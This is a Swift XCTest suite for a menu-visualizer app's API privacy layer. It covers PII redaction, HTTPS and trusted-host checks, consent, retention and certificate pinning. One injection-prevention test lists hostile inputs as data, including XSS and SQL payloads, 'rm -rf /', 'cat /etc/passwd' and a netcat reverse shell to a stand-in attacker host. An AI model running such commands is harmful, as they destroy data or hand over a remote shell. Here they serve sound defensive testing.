//
//  APIPrivacyTests.swift
//  Menu VisualizerTests
//
//  Comprehensive API privacy validation testing suite
//  Ensures all API communications comply with privacy requirements
//

import XCTest
import Network
@testable import Menu_Visualizer

final class APIPrivacyTests: XCTestCase {
    
    var apiPrivacyLayer: APIPrivacyLayer!
    var claudeAPIClient: ClaudeAPIClient!
    var consentManager: ConsentManager!
    var networkSecurityManager: NetworkSecurityManager!
    var testUtilities: TestUtilities!
    
    // Privacy compliance thresholds
    private let privacyThresholds = PrivacyThresholds(
        maxDataLeakage: 0.0,        // Zero tolerance for data leakage
        maxRequestSize: 10240,      // 10KB maximum request size
        requiredEncryption: true,   // All requests must be encrypted
        requiresConsent: true       // All API calls require user consent
    )
    
    override func setUpWithError() throws {
        try super.setUpWithError()
        
        apiPrivacyLayer = APIPrivacyLayer()
        claudeAPIClient = ClaudeAPIClient()
        consentManager = ConsentManager()
        networkSecurityManager = NetworkSecurityManager()
        testUtilities = TestUtilities()
        
        // Set up privacy-first environment
        claudeAPIClient.setPrivacyMode(enabled: true)
    }
    
    override func tearDownWithError() throws {
        apiPrivacyLayer = nil
        claudeAPIClient = nil
        consentManager = nil
        networkSecurityManager = nil
        testUtilities = nil
        
        try super.tearDownWithError()
    }
    
    // MARK: - Data Sanitization Tests
    
    func testSensitiveDataDetection() {
        let sensitiveTestCases = [
            // Email addresses
            ("Contact us at user@example.com for more info", true),
            ("Email: chef@restaurant.com", true),
            ("No email here", false),
            
            // Phone numbers
            ("Call us at (555) 123-4567", true),
            ("Phone: 555.123.4567", true),
            ("Recipe serves 4-6 people", false),
            
            // Personal identifiers
            ("SSN: 123-45-6789", true),
            ("Credit Card: 4532 1234 5678 9012", true),
            ("Table for 2 people", false),
            
            // URLs and web addresses
            ("Visit our website at www.restaurant.com", true),
            ("Check https://menu.example.com", true),
            ("Fresh basil and oregano", false),
            
            // Location data
            ("Located at 123 Main Street, Anytown", true),
            ("GPS: 40.7128° N, 74.0060° W", true),
            ("Served with seasonal vegetables", false)
        ]
        
        for (testText, shouldDetectSensitive) in sensitiveTestCases {
            let containsSensitive = apiPrivacyLayer.containsSensitiveData(testText)
            
            if shouldDetectSensitive {
                XCTAssertTrue(containsSensitive, "Should detect sensitive data in: \(testText)")
            } else {
                XCTAssertFalse(containsSensitive, "Should not flag safe content: \(testText)")
            }
        }
    }
    
    func testDataSanitization() {
        let testDish = Dish(name: "Special Dish - Call 555-123-4567",
                           description: "Amazing dish, email chef@restaurant.com for recipe. Visit www.restaurant.com",
                           price: "$19.99", category: .mainCourse, confidence: 0.9)
        
        let sanitizedPayload = apiPrivacyLayer.sanitizeDishPayload(testDish)
        
        // Should remove sensitive data
        XCTAssertFalse(sanitizedPayload.name.contains("555-123-4567"), "Should remove phone numbers")
        XCTAssertFalse(sanitizedPayload.description?.contains("chef@restaurant.com") ?? true, "Should remove email addresses")
        XCTAssertFalse(sanitizedPayload.description?.contains("www.restaurant.com") ?? true, "Should remove URLs")
        
        // Should preserve safe content
        XCTAssertTrue(sanitizedPayload.name.contains("Special Dish"), "Should preserve dish name")
        XCTAssertTrue(sanitizedPayload.description?.contains("Amazing dish") ?? false, "Should preserve description")
        
        // Should maintain data integrity
        XCTAssertFalse(sanitizedPayload.name.isEmpty, "Should not create empty names")
        XCTAssertNotNil(sanitizedPayload.description, "Should not remove entire description")
    }
    
    func testXSSAndInjectionPrevention() {
        let maliciousTestCases = [
            // XSS attacks
            "<script>alert('xss')</script>Chicken Pasta",
            "Beef <img src=x onerror=alert('xss')> Steak",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            
            // SQL injection
            "'; DROP TABLE dishes; --",
            "' OR '1'='1",
            "UNION SELECT * FROM users",
            
            // Command injection
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc -e /bin/sh attacker.com 4444",
            
            // HTML injection
            "<h1>Fake Menu</h1>",
            "<form action='malicious.com'>",
            "<meta http-equiv='refresh' content='0;url=evil.com'>"
        ]
        
        for maliciousInput in maliciousTestCases {
            let testDish = Dish(name: maliciousInput, description: maliciousInput,
                               price: "$15.99", category: .mainCourse, confidence: 0.9)
            
            let sanitizedPayload = apiPrivacyLayer.sanitizeDishPayload(testDish)
            
            // Should remove or escape malicious content
            XCTAssertFalse(sanitizedPayload.name.contains("<script>"), "Should sanitize script tags")
            XCTAssertFalse(sanitizedPayload.name.contains("DROP TABLE"), "Should sanitize SQL")
            XCTAssertFalse(sanitizedPayload.name.contains("rm -rf"), "Should sanitize commands")
            XCTAssertFalse(sanitizedPayload.name.contains("<iframe"), "Should sanitize HTML")
            
            XCTAssertFalse(sanitizedPayload.description?.contains("<script>") ?? true, "Should sanitize description")
            XCTAssertFalse(sanitizedPayload.description?.contains("DROP TABLE") ?? true, "Should sanitize description SQL")
        }
    }
    
    // MARK: - Request Privacy Tests
    
    func testHTTPSEnforcement() async throws {
        let testDish = testUtilities.createTestDish()
        
        // Test HTTP request (should be rejected)
        let httpRequest = URLRequest(url: URL(string: "http://api.anthropic.com/v1/messages")!)
        
        XCTAssertThrowsError(try apiPrivacyLayer.validateRequestSecurity(httpRequest)) { error in
            guard let privacyError = error as? APIPrivacyError else {
                XCTFail("Should throw APIPrivacyError")
                return
            }
            XCTAssertEqual(privacyError, .insecureProtocol, "Should reject HTTP requests")
        }
        
        // Test HTTPS request (should be accepted)
        let httpsRequest = URLRequest(url: URL(string: "https://api.anthropic.com/v1/messages")!)
        XCTAssertNoThrow(try apiPrivacyLayer.validateRequestSecurity(httpsRequest), "Should accept HTTPS requests")
    }
    
    func testTrustedHostValidation() throws {
        let trustedHosts = ["api.anthropic.com", "api.claude.ai"]
        let untrustedHosts = ["malicious.com", "fake-api.com", "phishing.org"]
        
        // Test trusted hosts
        for trustedHost in trustedHosts {
            let request = URLRequest(url: URL(string: "https://\(trustedHost)/v1/messages")!)
            XCTAssertNoThrow(try apiPrivacyLayer.validateRequestSecurity(request),
                            "Should accept trusted host: \(trustedHost)")
        }
        
        // Test untrusted hosts
        for untrustedHost in untrustedHosts {
            let request = URLRequest(url: URL(string: "https://\(untrustedHost)/v1/messages")!)
            XCTAssertThrowsError(try apiPrivacyLayer.validateRequestSecurity(request)) { error in
                guard let privacyError = error as? APIPrivacyError else {
                    XCTFail("Should throw APIPrivacyError for \(untrustedHost)")
                    return
                }
                XCTAssertEqual(privacyError, .untrustedHost, "Should reject untrusted host: \(untrustedHost)")
            }
        }
    }
    
    func testRequestSizeValidation() throws {
        let testDish = testUtilities.createTestDish()
        
        // Test normal size request
        let normalPayload = apiPrivacyLayer.sanitizeDishPayload(testDish)
        let normalData = try JSONEncoder().encode(normalPayload)
        XCTAssertLessThan(normalData.count, privacyThresholds.maxRequestSize,
                         "Normal request should be within size limit")
        
        // Test oversized request
        let largeDescription = String(repeating: "A", count: 50000) // 50KB description
        let largeDish = Dish(name: "Test", description: largeDescription,
                            price: "$10", category: .mainCourse, confidence: 0.9)
        
        XCTAssertThrowsError(try apiPrivacyLayer.validatePayloadSize(largeDish)) { error in
            guard let privacyError = error as? APIPrivacyError else {
                XCTFail("Should throw APIPrivacyError for oversized payload")
                return
            }
            XCTAssertEqual(privacyError, .payloadTooLarge, "Should reject oversized payload")
        }
    }
    
    func testPrivacyHeaders() {
        let headers = apiPrivacyLayer.getPrivacyHeaders()
        
        // Required privacy headers
        XCTAssertEqual(headers["DNT"], "1", "Should include Do Not Track header")
        XCTAssertEqual(headers["X-Privacy-Policy"], "privacy-first", "Should include privacy policy header")
        XCTAssertNotNil(headers["User-Agent"], "Should include user agent")
        XCTAssertTrue(headers["User-Agent"]?.contains("Privacy-First") ?? false, 
                     "User agent should indicate privacy focus")
        
        // Cache control headers
        XCTAssertEqual(headers["Cache-Control"], "no-cache, no-store, must-revalidate",
                      "Should prevent caching")
        XCTAssertEqual(headers["Pragma"], "no-cache", "Should include pragma no-cache")
        
        // Security headers
        XCTAssertEqual(headers["X-Content-Type-Options"], "nosniff", "Should include content type options")
        XCTAssertEqual(headers["X-Frame-Options"], "DENY", "Should include frame options")
    }
    
    // MARK: - Consent Management Tests
    
    func testConsentRequirementValidation() async throws {
        let testDish = testUtilities.createTestDish()
        
        // Test without consent
        consentManager.updateConsent(for: .apiCommunication, granted: false)
        
        let resultWithoutConsent = await claudeAPIClient.generateDishVisualization(for: testDish)
        
        switch resultWithoutConsent {
        case .success:
            XCTFail("Should not proceed without API consent")
            
        case .failure(let error):
            XCTAssertEqual(error, .consentRequired, "Should require consent for API calls")
        }
        
        // Test with consent
        consentManager.updateConsent(for: .apiCommunication, granted: true)
        consentManager.updateConsent(for: .dataProcessing, granted: true)
        
        // Should now allow API calls (would succeed if network conditions are met)
        XCTAssertTrue(consentManager.canMakeAPICalls(), "Should allow API calls with consent")
    }
    
    func testConsentWithdrawalHandling() async throws {
        let testDish = testUtilities.createTestDish()
        
        // Initially grant consent
        consentManager.updateConsent(for: .apiCommunication, granted: true)
        consentManager.updateConsent(for: .dataProcessing, granted: true)
        
        // Start API call
        let initialCall = Task {
            await claudeAPIClient.generateDishVisualization(for: testDish)
        }
        
        // Withdraw consent during call
        consentManager.updateConsent(for: .apiCommunication, granted: false)
        
        let result = await initialCall.value
        
        switch result {
        case .success:
            // If call completed before consent withdrawal, that's acceptable
            break
            
        case .failure(let error):
            XCTAssertTrue(error == .consentWithdrawn || error == .consentRequired,
                         "Should handle consent withdrawal: \(error)")
        }
    }
    
    func testMinimalDataPrinciple() {
        let testDish = Dish(name: "Test Dish",
                           description: "A delicious test dish with secret ingredients and preparation method",
                           price: "$15.99", category: .mainCourse, confidence: 0.9)
        
        let minimalPayload = apiPrivacyLayer.createMinimalPayload(for: testDish)
        
        // Should only include essential data
        XCTAssertEqual(minimalPayload.name, testDish.name, "Should include dish name")
        XCTAssertEqual(minimalPayload.category, testDish.category.rawValue, "Should include category")
        
        // Should exclude or minimize optional data
        XCTAssertTrue(minimalPayload.description?.count ?? 0 <= 200, "Should limit description length")
        
        // Should not include internal metadata
        let encoder = JSONEncoder()
        let payloadData = try! encoder.encode(minimalPayload)
        let payloadString = String(data: payloadData, encoding: .utf8)!
        
        XCTAssertFalse(payloadString.contains("confidence"), "Should not include confidence scores")
        XCTAssertFalse(payloadString.contains("id"), "Should not include internal IDs")
        XCTAssertFalse(payloadString.contains("timestamp"), "Should not include timestamps")
    }
    
    // MARK: - Response Privacy Tests
    
    func testResponseDataHandling() {
        let mockAPIResponse = """
        {
            "success": true,
            "visualization": {
                "description": "A perfectly grilled salmon with herbs",
                "visualStyle": "elegant restaurant presentation",
                "ingredients": ["salmon", "herbs", "lemon"],
                "preparationNotes": "Grilled to medium, seasoned lightly",
                "metadata": {
                    "processing_time": 1.5,
                    "model_version": "claude-3.5-sonnet",
                    "internal_id": "req_123456",
                    "server_location": "us-west-2"
                }
            }
        }
        """
        
        let sanitizedResponse = apiPrivacyLayer.sanitizeAPIResponse(mockAPIResponse.data(using: .utf8)!)
        
        // Should preserve essential visualization data
        XCTAssertTrue(sanitizedResponse.contains("grilled salmon"), "Should preserve description")
        XCTAssertTrue(sanitizedResponse.contains("herbs"), "Should preserve ingredients")
        
        // Should remove metadata that could compromise privacy
        XCTAssertFalse(sanitizedResponse.contains("internal_id"), "Should remove internal IDs")
        XCTAssertFalse(sanitizedResponse.contains("server_location"), "Should remove server location")
        XCTAssertFalse(sanitizedResponse.contains("req_123456"), "Should remove request IDs")
    }
    
    func testDataRetentionCompliance() {
        // Test session-only retention
        apiPrivacyLayer.setDataRetentionPolicy(.sessionOnly)
        
        let testVisualization = DishVisualization(dishId: UUID(),
                                                 generatedDescription: "Test description",
                                                 visualStyle: "Test style",
                                                 ingredients: ["test"],
                                                 preparationNotes: "Test notes")
        
        apiPrivacyLayer.storeVisualization(testVisualization)
        
        // Should be available during session
        XCTAssertNotNil(apiPrivacyLayer.getStoredVisualization(testVisualization.id),
                       "Should be available during session")
        
        // Simulate app termination
        apiPrivacyLayer.handleAppTermination()
        
        // Should be cleared after termination
        XCTAssertNil(apiPrivacyLayer.getStoredVisualization(testVisualization.id),
                    "Should be cleared after app termination")
    }
    
    func testNeverStorePolicy() {
        // Test never-store retention policy
        apiPrivacyLayer.setDataRetentionPolicy(.never)
        
        let testVisualization = DishVisualization(dishId: UUID(),
                                                 generatedDescription: "Test description",
                                                 visualStyle: "Test style",
                                                 ingredients: ["test"],
                                                 preparationNotes: "Test notes")
        
        // Should not store data with never-store policy
        XCTAssertThrowsError(try apiPrivacyLayer.storeVisualization(testVisualization)) { error in
            guard let privacyError = error as? APIPrivacyError else {
                XCTFail("Should throw APIPrivacyError")
                return
            }
            XCTAssertEqual(privacyError, .dataRetentionViolation, "Should reject storage with never-store policy")
        }
    }
    
    // MARK: - Network Security Tests
    
    func testCertificatePinning() async throws {
        // Test valid certificate
        let validCertData = testUtilities.getAnthropicCertificateData()
        let isValidCert = networkSecurityManager.validateCertificate(validCertData, for: "api.anthropic.com")
        XCTAssertTrue(isValidCert, "Should accept valid Anthropic certificate")
        
        // Test invalid certificate
        let invalidCertData = testUtilities.getFakeCertificateData()
        let isInvalidCert = networkSecurityManager.validateCertificate(invalidCertData, for: "api.anthropic.com")
        XCTAssertFalse(isInvalidCert, "Should reject invalid certificate")
    }
    
    func testTLSVersionValidation() throws {
        // Should require TLS 1.2 or higher
        let tlsVersions: [String: Bool] = [
            "TLSv1.0": false,  // Should reject
            "TLSv1.1": false,  // Should reject
            "TLSv1.2": true,   // Should accept
            "TLSv1.3": true    // Should accept
        ]
        
        for (version, shouldAccept) in tlsVersions {
            let isAccepted = networkSecurityManager.isTLSVersionAcceptable(version)
            XCTAssertEqual(isAccepted, shouldAccept, "TLS version \(version) validation failed")
        }
    }
    
    func testNetworkTimeoutLimits() async throws {
        // Test reasonable timeout limits
        let timeoutConfig = networkSecurityManager.getSecureTimeoutConfiguration()
        
        XCTAssertLessThanOrEqual(timeoutConfig.requestTimeout, 60.0, "Request timeout should be reasonable")
        XCTAssertGreaterThanOrEqual(timeoutConfig.requestTimeout, 10.0, "Request timeout should not be too short")
        XCTAssertLessThanOrEqual(timeoutConfig.resourceTimeout, 120.0, "Resource timeout should be reasonable")
    }
    
    // MARK: - Privacy Violation Detection Tests
    
    func testPrivacyViolationLogging() {
        let initialViolationCount = apiPrivacyLayer.getPrivacyViolationCount()
        
        // Trigger a privacy violation
        let sensitiveData = "Contact us at user@example.com for more info"
        let _ = apiPrivacyLayer.containsSensitiveData(sensitiveData) // This should log a violation
        
        let newViolationCount = apiPrivacyLayer.getPrivacyViolationCount()
        XCTAssertGreaterThan(newViolationCount, initialViolationCount, "Should log privacy violations")
        
        // Test violation details
        let violations = apiPrivacyLayer.getRecentPrivacyViolations(limit: 1)
        XCTAssertFalse(violations.isEmpty, "Should record violation details")
        
        let latestViolation = violations.first!
        XCTAssertEqual(latestViolation.type, .sensitiveDataDetected, "Should categorize violation type")
        XCTAssertFalse(latestViolation.details.contains("user@example.com"), "Should not log actual sensitive data")
    }
    
    func testPrivacyScoreCalculation() {
        let initialScore = apiPrivacyLayer.calculatePrivacyScore()
        XCTAssertEqual(initialScore, 1.0, "Initial privacy score should be perfect")
        
        // Trigger violations
        apiPrivacyLayer.recordPrivacyViolation(.sensitiveDataDetected, severity: .medium)
        apiPrivacyLayer.recordPrivacyViolation(.insecureTransmission, severity: .high)
        
        let newScore = apiPrivacyLayer.calculatePrivacyScore()
        XCTAssertLessThan(newScore, initialScore, "Privacy score should decrease with violations")
        XCTAssertGreaterThanOrEqual(newScore, 0.0, "Privacy score should not go below 0")
    }
    
    // MARK: - Compliance Audit Tests
    
    func testGDPRCompliance() async throws {
        let gdprCompliance = apiPrivacyLayer.performGDPRComplianceAudit()
        
        // Data minimization principle
        XCTAssertTrue(gdprCompliance.dataMinimization, "Should comply with data minimization")
        
        // Purpose limitation
        XCTAssertTrue(gdprCompliance.purposeLimitation, "Should comply with purpose limitation")
        
        // Data subject rights
        XCTAssertTrue(gdprCompliance.rightToErasure, "Should support right to erasure")
        XCTAssertTrue(gdprCompliance.rightToPortability, "Should support data portability")
        
        // Lawful basis for processing
        XCTAssertTrue(gdprCompliance.hasLawfulBasis, "Should have lawful basis for processing")
        
        // Technical and organizational measures
        XCTAssertTrue(gdprCompliance.technicalMeasures, "Should implement technical measures")
        XCTAssertTrue(gdprCompliance.organizationalMeasures, "Should implement organizational measures")
    }
    
    func testCCPACompliance() {
        let ccpaCompliance = apiPrivacyLayer.performCCPAComplianceAudit()
        
        // Consumer rights
        XCTAssertTrue(ccpaCompliance.rightToKnow, "Should support right to know")
        XCTAssertTrue(ccpaCompliance.rightToDelete, "Should support right to delete")
        XCTAssertTrue(ccpaCompliance.rightToOptOut, "Should support opt-out rights")
        
        // Non-discrimination
        XCTAssertTrue(ccpaCompliance.nonDiscrimination, "Should not discriminate based on privacy choices")
        
        // Service provider requirements
        XCTAssertTrue(ccpaCompliance.serviceProviderCompliance, "Should comply with service provider requirements")
    }
    
    // MARK: - Performance Impact Tests
    
    func testPrivacyOverheadMeasurement() async throws {
        let testDish = testUtilities.createTestDish()
        
        // Measure without privacy checks
        apiPrivacyLayer.setPrivacyChecksEnabled(false)
        let startTimeWithoutPrivacy = Date()
        let _ = apiPrivacyLayer.sanitizeDishPayload(testDish)
        let timeWithoutPrivacy = Date().timeIntervalSince(startTimeWithoutPrivacy)
        
        // Measure with privacy checks
        apiPrivacyLayer.setPrivacyChecksEnabled(true)
        let startTimeWithPrivacy = Date()
        let _ = apiPrivacyLayer.sanitizeDishPayload(testDish)
        let timeWithPrivacy = Date().timeIntervalSince(startTimeWithPrivacy)
        
        let overhead = timeWithPrivacy - timeWithoutPrivacy
        
        // Privacy overhead should be reasonable
        XCTAssertLessThan(overhead, 0.1, "Privacy overhead should be minimal: \(overhead)s")
    }
    
    func testConcurrentPrivacyValidation() async throws {
        let dishes = (0..<10).map { index in
            testUtilities.createTestDish(name: "Concurrent Test Dish \(index)")
        }
        
        let startTime = Date()
        
        // Validate privacy concurrently
        await withTaskGroup(of: Void.self) { group in
            for dish in dishes {
                group.addTask {
                    let _ = self.apiPrivacyLayer.sanitizeDishPayload(dish)
                    try? await Task.sleep(nanoseconds: 10_000_000) // 10ms
                }
            }
        }
        
        let totalTime = Date().timeIntervalSince(startTime)
        
        // Concurrent validation should be efficient
        XCTAssertLessThan(totalTime, 1.0, "Concurrent privacy validation should complete quickly")
    }
}

// MARK: - Test Configuration

private struct PrivacyThresholds {
    let maxDataLeakage: Double
    let maxRequestSize: Int
    let requiredEncryption: Bool
    let requiresConsent: Bool
}

// MARK: - Privacy Error Types

enum APIPrivacyError: Error, Equatable {
    case insecureProtocol
    case untrustedHost
    case payloadTooLarge
    case sensitiveDataDetected
    case consentRequired
    case consentWithdrawn
    case dataRetentionViolation
    
    var localizedDescription: String {
        switch self {
        case .insecureProtocol:
            return "Insecure protocol not allowed"
        case .untrustedHost:
            return "Untrusted host not allowed"
        case .payloadTooLarge:
            return "Request payload too large"
        case .sensitiveDataDetected:
            return "Sensitive data detected in payload"
        case .consentRequired:
            return "User consent required for API calls"
        case .consentWithdrawn:
            return "User consent has been withdrawn"
        case .dataRetentionViolation:
            return "Data retention policy violation"
        }
    }
}

// MARK: - Compliance Audit Types

private struct GDPRCompliance {
    let dataMinimization: Bool
    let purposeLimitation: Bool
    let rightToErasure: Bool
    let rightToPortability: Bool
    let hasLawfulBasis: Bool
    let technicalMeasures: Bool
    let organizationalMeasures: Bool
}

private struct CCPACompliance {
    let rightToKnow: Bool
    let rightToDelete: Bool
    let rightToOptOut: Bool
    let nonDiscrimination: Bool
    let serviceProviderCompliance: Bool
}

// MARK: - Privacy Violation Types

private struct PrivacyViolation {
    let id: UUID = UUID()
    let timestamp: Date = Date()
    let type: ViolationType
    let severity: Severity
    let details: String
    
    enum ViolationType {
        case sensitiveDataDetected
        case insecureTransmission
        case unauthorizedAccess
        case dataRetentionViolation
        case consentViolation
    }
    
    enum Severity {
        case low, medium, high, critical
    }
}